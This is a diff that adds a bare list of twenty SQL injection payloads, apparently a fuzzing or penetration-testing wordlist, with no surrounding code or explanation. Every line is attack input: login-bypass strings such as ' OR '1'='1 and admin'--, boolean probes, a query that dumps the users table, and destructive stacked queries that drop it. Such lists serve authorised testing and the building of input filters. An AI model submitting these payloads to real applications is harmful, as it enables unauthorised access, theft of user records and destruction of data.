@@ -1,0 +1,20 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+admin'--
+' OR 'x'='x
+1' OR '1'='1
+' OR ''='
+1 OR 1=1
+' OR 1=1#
+" OR 1=1--
+') OR ('1'='1
+'; DROP TABLE users--
+1'; DROP TABLE users--
+' AND 1=1--
+' AND 1=2--
+' OR 1=1 ORDER BY 1--
+' OR 'a'='a
+admin'#
+1; SELECT * FROM users--
+' OR 1=1 LIMIT 1--
